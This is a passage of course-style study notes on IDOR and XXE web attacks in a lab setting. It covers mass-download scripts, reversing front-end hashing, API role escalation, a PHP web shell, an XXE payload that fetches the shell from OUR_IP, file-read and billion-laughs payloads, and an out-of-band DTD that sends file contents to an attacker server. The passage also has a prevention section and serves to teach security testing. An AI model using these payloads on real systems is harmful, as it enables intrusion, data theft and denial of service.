curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class=''pure-tree_link''>"
```

A cleaner approach uses a Regex pattern that matches everything between `/documents` and `.pdf`:

```shellsession
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
```

Command explained:
- `curl -s` fetches the page **silently** (`-s` hides the progress bar and errors).
- `|` pipes curl''s output into `grep`.
- `-o` makes grep print **only the matched part**, not the whole line.
- `-P` enables **Perl-style regex**, so `.*?` works as a shortest (non-greedy) match.
- `"/documents.*?.pdf"` matches the shortest text starting at `/documents` and ending at `.pdf` — i.e. the file path.

Output:

```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

**Step 3 — Write a loop to enumerate all users and download every file**

Use a `for` loop to go through UIDs 1–10, extract all document links for each user, and download them with `wget`:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Script explained step by step:
- `url="http://SERVER_IP:PORT"` stores the target base address in a variable.
- `for i in {1..10}` loops the uid value `i` from 1 to 10 (ten employees).
- The inner `for link in $(...)` runs the curl + grep command and loops over each PDF path it finds.
- `wget -q $url/$link` downloads each file; `-q` means **quiet** (no output).

When you run this script, it downloads all documents for every employee from UID 1 to 10, successfully exploiting the IDOR vulnerability to mass enumerate and collect data across all accounts. You can also achieve the same result using tools like **Burp Intruder** or **ZAP Fuzzer** instead of a bash script.

---

### Bypassing Encoded References

In the previous section, the IDOR used employee UIDs in plain text — easy to enumerate. Some applications go further and **hash or encode** their object references to make enumeration harder. However, if the hashing logic runs on the front-end (in JavaScript), it is still fully visible to attackers and can be reversed and replicated.

#### Identify

Going back to the **Employee Manager** web application, we test the **Contracts** section. When we click on `Employment_contract.pdf` to download it, Burp Suite intercepts a POST request to `/download.php` with this data:

```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Using a `download.php` script (instead of linking files directly) is a common practice, because directly linked files can be exploited by other web attacks. This value looks like an **MD5 hash**. Since hashes are one-way functions, we cannot simply decode them. We need to figure out what value is being hashed. We can start by trying common values like `uid`, `username`, or `filename` and check if their MD5 hashes match:

```shellsession
echo -n 1 | md5sum
# c4ca4238a0b923820dcc509a6f75849b
```

Command explained:
- `echo -n 1` prints `1` with **no trailing newline** (`-n`), so we hash exactly `1`.
- `| md5sum` pipes that into `md5sum`, which prints the MD5 hash.

This doesn''t match. Trying other simple values also fails. At this point, the hash could be for a unique or combined value — which would make it a **Secure Direct Object Reference**. However, there is one fatal flaw: the hash is being calculated on the **front-end**.

#### Function Disclosure

Most modern web applications use JavaScript frameworks like Angular, React, or Vue.js. A common developer mistake is performing sensitive operations — like hash generation — in the front-end JavaScript, which exposes the full logic to anyone who reads the source.

Looking at the page source, we find the link is calling a JavaScript function:

```
javascript:downloadContract(''1'')
```

Inspecting the `downloadContract()` function in the source code reveals:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Now we can see exactly what is happening:

- `btoa(uid)` → Base64-encodes the UID (`btoa` is JavaScript''s built-in base64 encoder)
- `CryptoJS.MD5(...)` → MD5-hashes the Base64 result
- The final hash is sent as the `contract` POST parameter

The function is called with `downloadContract(''1'')`, so for UID 1, the value being hashed is the Base64 encoding of `1`.

#### Verify the Hash

We can confirm this by replicating the same steps manually:

```shellsession
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Command explained:
- `echo -n 1` outputs `1` with no newline.
- `base64 -w 0` base64-encodes it; `-w 0` means **no line wrapping**, so no newline is added.
- `md5sum` hashes the result.

> **Tip:** Use `-n` with `echo` to avoid adding a newline, and `-w 0` with `base64` to prevent line wrapping. Both would change the MD5 output if included.

The hash matches exactly — we have successfully **reversed the front-end hashing technique** and turned what appeared to be a secure reference into an exploitable IDOR.

#### Mass Enumeration

Now that we know the formula (`Base64(uid)` → `MD5`), we can generate hashes for any user and use them to download their contracts.

**Step 1 — Generate hashes for all UIDs**

Use a loop to calculate the hash for employees 1 through 10 and strip the trailing ` -` from `md5sum` output using `tr -d`:

```shellsession
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d '' -''; done
```

Command explained:
- `for i in {1..10}` loops `i` from 1 to 10.
- For each `i`, `echo -n $i | base64 -w 0 | md5sum` builds the same base64 + MD5 value the app uses.
- `tr -d '' -''` **deletes** the trailing space and dash that `md5sum` prints, leaving a clean hash.

Output:

```
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

**Step 2 — Send POST requests for each hash to download contracts**

Write a bash script that generates each hash and sends a POST request to `/download.php` with `curl`:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d '' -''); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

Command explained:
- The outer loop runs uid `i` from 1 to 10; the inner loop computes the clean `hash` for that uid.
- `curl -sOJ -X POST -d "contract=$hash" .../download.php` downloads each contract:
  - `-s` = silent, `-O` = save the response **to a file**, `-J` = use the server''s suggested filename (from the `Content-Disposition` header).
  - `-X POST` sets the method to POST; `-d "contract=$hash"` sends the hash as POST data.

**Step 3 — Run the script and verify downloaded files**

```shellsession
bash ./exploit.sh
ls -1
```

- `bash ./exploit.sh` runs the script.
- `ls -1` lists the downloaded files, one per line (`-1`).

Output:

```
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

All 10 employee contracts are downloaded successfully. By reversing the front-end hashing technique, we turned a reference that looked secure into a fully exploitable IDOR — and used it to mass enumerate private files across all user accounts.

---

### IDOR in Insecure APIs

So far, IDOR has been used to access files and resources outside our user''s access. But IDOR vulnerabilities can also exist in **API function calls**, allowing us to perform actions as other users — not just read their data.

There are two types to understand:

- **IDOR Information Disclosure** — reads other users'' data (files, records, profiles)
- **IDOR Insecure Function Calls** — calls APIs or executes functions as another user (change passwords, modify profiles, buy items, delete accounts)

In many real attacks, these two types are chained together — first leak data through Information Disclosure, then use that data to exploit Insecure Function Calls.

#### Identifying Insecure APIs

In the **Employee Manager** app, we navigate to the **Edit Profile** page. The page lets us edit `Full Name`, `Email`, and `About Me`. When we click **Update Profile** and intercept the request in Burp, we see a **PUT request** to `/profile/api.php/profile/1` with this JSON body:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

> **Note on HTTP methods in APIs:** PUT = update, POST = create, DELETE = delete, GET = retrieve.

The interesting fields here are `uid`, `uuid`, and `role`. The `role` field is set to `employee` and is also reflected in the `Cookie: role=employee` header — meaning **access control is being handled on the client side**, which is a critical security mistake. An attacker could manipulate any of these fields. Unless the back-end has solid access control, we may be able to set an arbitrary, more privileged role — but first we need to learn what other role names exist.

#### Exploiting Insecure APIs

We know we can freely change `full_name`, `email`, and `about` (visible form fields). Now let''s test the hidden parameters to see what else we can control.

**Attempt 1 — Change `uid` to another user''s ID**

Set `"uid": 2` in the JSON body. The server responds with `uid mismatch`. The app is comparing the JSON `uid` to the API endpoint (`/1`), so this check stops us from directly hijacking another account this way.

**Attempt 2 — Change the API endpoint to another user**

Change the endpoint to `/profile/api.php/profile/2` and set `"uid": 2`. The server responds with `uuid mismatch`. The app is checking that the `uuid` in the request matches the target user''s actual UUID — and since we don''t know User 2''s UUID, we''re blocked again.

**Attempt 3 — Try creating a new user (POST request)**

Change the request method to POST and send a new `uid`. The server responds: `Creating new employees is for admins only`. Sending a DELETE request gives a similar response: `Deleting employees is for admins only`. The app is using the `role=employee` cookie to check authorization.

**Attempt 4 — Try changing role to admin**

Change `"role": "employee"` to `"role": "admin"` or `"role": "administrator"`. The server responds: `Invalid role`. Without knowing a valid role name, we cannot escalate privileges this way.

At this point, all direct function call attempts have failed. However, we have only been testing **IDOR Insecure Function Calls**. We have not yet tested the API''s **GET request for IDOR Information Disclosure**. If the GET endpoint has no access control, we may be able to read other users'' full profile details — including their `uuid` — which would unlock the attacks that failed above.

---

### Chaining IDOR Vulnerabilities

The most powerful IDOR attacks chain two types together: first **leak data** using IDOR Information Disclosure, then **abuse functions** using IDOR Insecure Function Calls. This section shows how those two work together to achieve full application takeover.

After the Edit Profile page loads, we notice the app sends a **GET request** to the same API endpoint (`/profile/api.php/profile/1`) to fetch our profile details. The only authorization in this request is the `Cookie: role=employee` header — there is no JWT token or any other user-specific verification. This means the back-end may not be checking whether the session belongs to the requested profile.

#### Information Disclosure

We send a GET request but change the UID in the endpoint to another user''s ID (e.g. `/profile/api.php/profile/2`). The server responds with that user''s full profile:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

This confirms an **IDOR Information Disclosure vulnerability**. We now have User 2''s `uuid` — the exact value we were missing when our PUT request failed with `uuid mismatch`.

#### Modifying Other Users'' Details

Now that we have User 2''s `uuid`, we send a PUT request to `/profile/api.php/profile/2` using their `uid` and `uuid` alongside any changes we want to make. This time we get no access control errors, and a follow-up GET request confirms their details were successfully updated.

This opens up several follow-on attacks:

- **Account Takeover via Password Reset** — change the user''s email to one we control, then trigger a password reset. The reset link goes to our email.
- **XSS via Profile Field** — inject an XSS payload into the `about` field. When the user visits their Edit Profile page, the script executes and we can attack them further.

#### Chaining Two IDOR Vulnerabilities

Now we enumerate all users using the same GET request technique, looping through UIDs to collect everyone''s details. Eventually we find an admin account:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

We now know the valid admin role name: `web_admin`. Earlier, trying `"role": "admin"` gave us `Invalid role`. Now we can use the correct name.

**Step 1 — Set our own role to `web_admin`**

Intercept our own Update Profile PUT request and change `"role": "employee"` to `"role": "web_admin"`. This time we get no `Invalid role` error and no access control rejection. A follow-up GET confirms the change:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

**Step 2 — Update the session cookie**

Refresh the page to update the cookie automatically, or manually set `Cookie: role=web_admin` in Burp to use the new role immediately.

**Step 3 — Create or delete users**

Now send a POST request to create a new user — no error this time. A GET request confirms the new user was created successfully. We can also delete users with a DELETE request, since the `Deleting employees is for admins only` check now passes with our admin role.

By combining an **IDOR Information Disclosure** vulnerability (leaking UUIDs and role names) with an **IDOR Insecure Function Call** (setting our own role and modifying others'' data), we achieved full administrative control over the entire application — bypassing every access control check that initially blocked us. With admin rights we could also do **mass assignment** attacks, such as changing every user''s email or planting XSS in all profiles.

---

### IDOR Prevention

IDOR vulnerabilities are mainly caused by **improper access control on the back-end**. To prevent them, two things must work together: a strong object-level access control system, and secure object referencing that avoids predictable or guessable IDs.

#### Object-Level Access Control (RBAC)

Access control should be at the core of any web application''s design, as it affects every area of the system. The most reliable approach is a **Role-Based Access Control (RBAC)** system that maps user roles and permissions to every object and resource in the application.

Once RBAC is in place, every request a user makes is checked against their assigned role. The back-end either allows or denies the request based on whether the user has the right privileges for that specific object. Here is an example of secure access control logic:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == ''admin'');
}
```

This code retrieves the user''s role and identity from the **server-side session token** — not from a cookie or JSON body sent by the client. A user can only read or write their own profile (`user.uid == userId`), unless they have the `admin` role verified on the back-end. This is the right approach because user privileges are never passed through the HTTP request where the client could manipulate them.

In our attacks, we exploited role values stored in cookies (`Cookie: role=employee`) and JSON request bodies (`"role": "employee"`) — both under the client''s control. The above RBAC example eliminates that risk entirely by keeping privileges server-side.

#### Object Referencing

Even with a solid access control system, using predictable object references like `uid=1` makes it trivial for attackers to guess and enumerate other IDs. We should always use **strong, unique, unpredictable references** like **UUIDs (Version 4)**:

```
89c9b29b-d19f-4515-b2dd-abb6e693eb20
```

UUIDs are generated server-side when an object is created, stored in the back-end database, and mapped to the actual internal record. Whenever a UUID is received in a request, the database uses the map to return the correct object. This is how it can look in PHP:

```php
$uid = intval($_REQUEST[''uid'']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href=''" . $row[''url''] . "'' target=''_blank''></a>";
```

Key rules to follow for secure object referencing:

- **Never calculate hashes on the front-end** — always generate them server-side when the object is created.
- **Store UUIDs in the database** and create maps for quick cross-referencing.
- **UUIDs alone are not enough** — they make IDOR harder to find but won''t stop it if access control is broken. As we saw in this module, even unique references can be exploited by replaying one user''s request with another user''s session.

Implementing both strong access control (RBAC) and strong object referencing (UUIDs) together provides solid protection against IDOR vulnerabilities.

---

## Section 3: XML External Entity (XXE) Injection

---

### Intro to XXE

XXE (XML External Entity) Injection is a vulnerability that occurs when an application parses XML input from a user without properly sanitizing or restricting it. This allows attackers to inject malicious XML that references external entities — like local files on the server — and have their content returned in the response.

XXE is considered one of OWASP''s Top 10 Web Security Risks because of how much damage it can cause — from reading sensitive config files and source code, to stealing credentials, executing remote code, or even crashing the server with a Denial of Service attack.

#### XML Basics

XML (Extensible Markup Language) is a markup language used to store and transfer structured data. Unlike HTML (which displays data), XML is focused on organizing and representing data structures. XML documents are formed of element trees, where each element is denoted by a tag. The first element is called the **root element**, and all others are **child elements**.

Here is a basic example of an XML email document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body>
</email>
```

Key XML components:

| Component   | Definition                                       | Example                   |
| ----------- | ------------------------------------------------ | ------------------------- |
| Tag         | Keys of an XML document, wrapped with `</>`      | `<date>`                  |
| Entity      | XML variables, wrapped with `&;`                 | `&lt;`                    |
| Element     | A tag and its value between start and end tags   | `<date>01-01-2022</date>` |
| Attribute   | Optional specifications stored inside a tag      | `version="1.0"`           |
| Declaration | First line of an XML file, sets version/encoding | `<?xml version="1.0"?>`   |

Some characters are reserved as part of XML document structure: `<`, `>`, `&`, and `"`. If you need to use these inside an XML document as data (not structure), you must replace them with their **entity references**:

| Character | Entity Reference |
| --------- | ---------------- |
| `<`       | `&lt;`           |
| `>`       | `&gt;`           |
| `&`       | `&amp;`          |
| `"`       | `&quot;`         |

XML also supports comments using `<!-- comment -->`, the same as HTML.

#### XML DTD (Document Type Definition)

A DTD defines and validates the expected structure of an XML document — which elements exist, which are children of which, and what type of data they contain. The DTD can be defined **inside the XML document itself** or stored in an **external file**.

Here is an example DTD for the email XML document above:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

The DTD declares the root `email` element and lists its child elements. Each child is then declared individually. `#PCDATA` means the element contains raw text data (Parsed Character Data). Elements with `?` are optional and elements with `*` can repeat.

The DTD can be embedded directly in the XML right after the declaration, or stored externally and referenced with the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

It can also be referenced via a URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

This works similarly to how HTML documents link to external JavaScript or CSS files.

#### XML Entities

XML entities act like **variables** inside a DTD. They allow you to define a value once and reuse it throughout the document, reducing repetitive data. Entities are defined using the `ENTITY` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once defined, you reference the entity anywhere in the document using `&company;`. The XML parser will replace `&company;` with `Inlane Freight` every time it encounters it.

More importantly, XML entities can also be **external** — meaning they reference a file or URL using the `SYSTEM` keyword:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

> **Note:** The `PUBLIC` keyword can be used instead of `SYSTEM` for publicly declared standards or resources (e.g. language codes like `lang="en"`). In most cases, both work the same way.

When you reference `&signature;` in the XML document, the parser replaces it with the contents of `signature.txt` from the server. **This is the core of XXE attacks.** When XML is parsed on the server-side — in SOAP APIs, contact forms, or file upload functions — an external entity can reference a sensitive file on the back-end server, and its contents get returned to the attacker when the entity is referenced in the response.

---

### Local File Disclosure

When a web application trusts unfiltered XML input, an attacker can define external XML entities that reference local files on the server. If the application reflects any of those entity values back in the response, the file contents get displayed to the attacker. This is the core of an XXE Local File Disclosure attack.

#### Identifying

The first step is finding a web page that accepts XML input. A common example is a **Contact Form**. Fill in the form, click Send, and intercept the request in Burp Suite. If the request body is in XML format (e.g. with `<name>`, `<email>`, `<message>` tags), it is a potential XXE target.

Next, check if any field value is **reflected back in the response**. For example, if the response shows `Check your email email@example.com for further instructions`, then the `<email>` field value is being echoed back. This tells us which field to inject into.

> **Note:** Some apps default to JSON but still accept XML. Try changing the `Content-Type` header to `application/xml` and convert the JSON body to XML with an online tool. If the app accepts it, test for XXE.

#### Step-by-Step: Exploiting XXE to Read Local Files

**Step 1 — Test if entities are processed**

Add a custom internal entity to the XML and reference it in the reflected field:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Use `&company;` in the `<email>` field. If the response shows `Inlane Freight` instead of `&company;` as a raw string, the parser is processing entities — the app is vulnerable to XXE.

> **Note:** If the XML request has no existing DTD, add the `DOCTYPE` block before defining your entity. If a `DOCTYPE` is already present, just add the `ENTITY` line inside it.

**Step 2 — Reference a local file**

Replace the internal entity with an external one using the `SYSTEM` keyword and the `file://` path:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Use `&company;` in the `<email>` field and send the request. If the response contains the contents of `/etc/passwd`, the XXE exploit worked. From here, you can read any file the web server process has access to — SSH keys, config files with database passwords, `.env` files, and more.

> **Tip:** In Java web applications, you can sometimes specify a **directory path** instead of a file, and the response will contain a directory listing — useful for finding sensitive files.

**Step 3 — Read PHP source code using the base64 filter**

Directly referencing a PHP file usually fails because PHP code contains XML-breaking characters like `<`, `>`, and `&`. Use PHP''s `php://filter` wrapper to base64-encode the file first so it doesn''t break the XML format:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

The response will contain a base64-encoded string. Select it in Burp Suite and check the **Inspector tab** on the right pane — it will automatically decode and show the PHP source code. You can also decode it yourself on the command line with `echo -n "<base64>" | base64 -d`.

> **Note:** This trick only works on PHP-based web applications.

#### Remote Code Execution via XXE

Beyond file reading, XXE can sometimes be used for **Remote Code Execution (RCE)**. There are a few approaches:

- **SSH keys** — read `/home/user/.ssh/id_rsa` and use it to SSH into the server.
- **Hash stealing** — on Windows, use XXE to trigger an SMB request to your server and capture the hash.
- **PHP expect filter** — if the server has the PHP `expect` module installed, you can run commands directly using `expect://id`. However, this module is **not installed by default** on modern PHP servers.

The most reliable RCE method is uploading a web shell:

**Step 1 — Create the web shell and start an HTTP server:**

```shellsession
echo ''<?php system($_REQUEST["cmd"]);?>'' > shell.php
sudo python3 -m http.server 80
```

Commands explained:
- `echo ''<?php system($_REQUEST["cmd"]);?>'' > shell.php` writes a one-line PHP web shell to `shell.php`. It runs whatever command is sent in the `cmd` parameter.
- `sudo python3 -m http.server 80` starts a simple web server on **port 80** so the target can download `shell.php`; `sudo` is needed because port 80 is privileged.

**Step 2 — Use XXE with the `expect` filter to download your shell:**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS''OUR_IP/shell.php''">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> **Note:** Spaces in the command are replaced with `$IFS` to avoid breaking the XML syntax (`$IFS` is the shell''s internal field separator, which expands to whitespace). Characters like `|`, `>`, and `{` can also break the command, so avoid them.

Once the server fetches your `shell.php`, you can interact with it for code execution. Because `expect` is rarely available, XXE is most reliably used for **file disclosure** rather than RCE.

#### Other XXE Attacks

**SSRF via XXE**

XXE can be used to perform **Server-Side Request Forgery (SSRF)** attacks — making the server send HTTP requests to internal services, enumerate open ports, or access restricted internal web pages. This is done by pointing the external entity to an internal URL:

```xml
<!ENTITY company SYSTEM "http://localhost:8080/admin">
```

**Denial of Service (DoS) via Entity Loops**

XXE can be used to crash the server by defining a chain of self-referencing entities that expand exponentially, consuming all server memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

`a0` is defined as `DOS`, then `a1` references it 10 times, `a2` references `a1` 10 times, and so on. By the time `&a10;` is expanded, the server has to process billions of entity references — causing memory exhaustion. Modern web servers like Apache protect against this, so this attack may not work on updated systems.

---

### Advanced File Disclosure

Not all XXE vulnerabilities are straightforward to exploit. Some file formats cannot be read through basic XXE because their content breaks the XML format. In other cases, the web application may not output any input values at all, so we need to force the data out through errors or out-of-band channels.

#### Advanced Exfiltration with CDATA

In the Local File Disclosure section, we used PHP''s `php://filter` to base64-encode PHP source files so they wouldn''t break the XML format. But this only works for PHP. For any other web framework, we need a different approach.

We can wrap the file content in a **CDATA tag** (`<![CDATA[ FILE_CONTENT ]]>`). The XML parser treats everything inside CDATA as raw data — it ignores special characters like `<`, `>`, and `&` inside it. This allows us to include any file content without breaking the XML format.

The naive approach would be to define three internal entities and join them:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, **this does not work** — XML prevents joining internal and external entities together. We need a different approach.

The solution is to use **XML Parameter Entities** — a special entity type that starts with `%` and can only be used inside a DTD. The key property is: if parameter entities are referenced from an **external DTD file** hosted on our server, they are all treated as external and can be joined freely.

**Step 1 — Create the xxe.dtd file on your machine and host it:**

```shellsession
echo ''<!ENTITY joined "%begin;%file;%end;">'' > xxe.dtd
python3 -m http.server 8000
```

Commands explained:
- `echo ''...'' > xxe.dtd` writes the `joined` parameter-entity definition into a file named `xxe.dtd`.
- `python3 -m http.server 8000` serves the current folder on **port 8000**, so the target can fetch `xxe.dtd`.

Output:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Step 2 — Send this XML payload to the target:**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">         <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>">                 <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>               <!-- reference the &joined; entity to print the file content -->
```

When processed, the server fetches your `xxe.dtd` file, uses it to join the CDATA wrapper around the file content, and returns the full PHP source code in the response — without any base64 encoding and without breaking the XML format.

> **Note:** On some modern web servers, you may not be able to read files like `index.php` because the server protects against entity self-reference loops (which can cause a DoS). If that happens, try other files.

This technique works with **any web framework**, not just PHP, making it very useful when basic XXE methods fail.

#### Error-Based XXE

Sometimes a web application does not display any XML entity output at all — we have no reflected field to inject into. However, if the application **displays PHP runtime errors** and lacks proper exception handling, we can exploit those errors to leak file content.

**How it works:** First, confirm the app shows errors by sending malformed XML — delete a closing tag, use `<roo>` instead of `<root>`, or reference a non-existing entity. If the app throws a PHP error and reveals the server directory path in the message, we can use that to our advantage.

**Step 1 — Create the error-triggering DTD file and host it:**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM ''%nonExistingEntity;/%file;''>">
```

This defines two parameter entities:

- `%file` reads the target file
- `%error` tries to load a path that joins a non-existing entity with the file content — which triggers an error containing the file content in the error message

**Step 2 — Send the payload referencing your DTD:**

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The server loads your DTD, tries to process `%nonExistingEntity;/%file;` — a path that doesn''t exist — and throws an error message that includes the `%file;` content as part of the invalid URI. The file content appears in the error output.

> **Note:** This method can also be used to read source code files, but it is less reliable than the CDATA method — it may have length limitations, and special characters in the file can still break the error output.

---

### Blind Data Exfiltration

In the previous section, the app displayed PHP errors which we used to leak file content. But what if the app shows **no output at all** — no reflected entities, no error messages? This is a completely blind XXE situation, and it requires a different strategy called **Out-of-Band (OOB) Data Exfiltration**.

Instead of making the app print file content to the page, we make the app **send the file content to our own server** via an HTTP request. This is the same concept used in blind SQL injection, blind command injection, and blind XSS — the app never shows us anything, but it makes outbound requests that we can capture.

#### Out-of-Band Data Exfiltration

The attack works like this:

1. We host a DTD file on our machine
2. The vulnerable app fetches our DTD
3. The DTD instructs the app to read a local file, base64-encode it, and send it to our server as a URL parameter
4. We capture and decode the data on our end

**Step 1 — Create the OOB exfiltration DTD (`xxe.dtd`) on your machine:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM ''http://OUR_IP:8000/?content=%file;''>">
```

- `%file` reads `/etc/passwd` and base64-encodes it using PHP''s filter
- `%oob` creates an entity that makes an HTTP request to our server, placing the base64 data as a URL query parameter `?content=`

**Step 2 — Create a PHP listener (`index.php`) that decodes and logs incoming data:**

```php
<?php
if(isset($_GET[''content''])){
    error_log("\n\n" . base64_decode($_GET[''content'']));
}
?>
```

This script reads the `content` parameter from incoming GET requests, base64-decodes it, and logs the result to the terminal.

**Step 3 — Start your PHP server:**

```shellsession
vi index.php   # write the above PHP code
php -S 0.0.0.0:8000
```

Commands explained:
- `vi index.php` opens the `vi` editor so you can paste the decoding PHP code and save it as `index.php`.
- `php -S 0.0.0.0:8000` starts PHP''s built-in server on **all interfaces**, port **8000**, so the target can reach it and the script runs on each request.

Output:

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

**Step 4 — Send the XXE payload to the target:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

- `%remote` fetches your hosted DTD
- `%oob` is evaluated, creating the `content` entity that triggers the HTTP request back to your server with the file data
- `&content;` references the entity to trigger execution

**Step 5 — Receive and read the exfiltrated data on your terminal:**

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
